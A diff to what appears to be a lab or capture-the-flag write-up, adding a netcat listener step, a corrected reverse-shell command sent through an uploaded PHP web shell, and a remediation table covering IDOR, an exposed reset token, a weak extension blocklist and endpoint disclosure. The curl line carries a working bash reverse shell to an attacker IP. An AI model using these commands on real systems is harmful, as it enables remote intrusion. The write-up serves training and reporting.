@@ -117,11 +117,37 @@ accept attribute restricts the file type.
    curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.155.72/4444+0>%261'"
    ```
 
-7) To get a flag:
+7) To listen on:
+   ```
+   nc -lvnp 4444
+   ```
+
+8) To get a flag:
    ```
    cat /var/www/flag.txt
    ```
 
 
 
+curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.155.72/4444+0>%261'" -> wrong
+curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.77.3/4444+0>%261'" -> correct
 
+> Listener(nc) & the command (curl)
+
+# The Attack Chain (Remediation Summary)
+
+Writing the report for this engagement:
+|Vulnerability|Serverity|Remediation|
+|------|-------|-------|
+|IDOR on user profiles and API| High| Implemetn server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requrested resource.|
+|Password reset token exposed in the response| Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters.|
+|Incomplete file extension blocklist|Critical| Use an allowlist rather than a bloacklist. Only permit specific, expected extensions. Validate file content (MIME) type) in addition to the extension. Store uploaded files outside the web root.
+|AI endpoint disclosure| Medium | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users.|
+
+# Conclusion
+
+1. Enumeration
+2. Small flaws chain into big compromises
+3. Client-side restrictions are not security.
+4. Password reset mechanisms deserve careful attention.
+5. Think like an attacker, report like a consultant. 
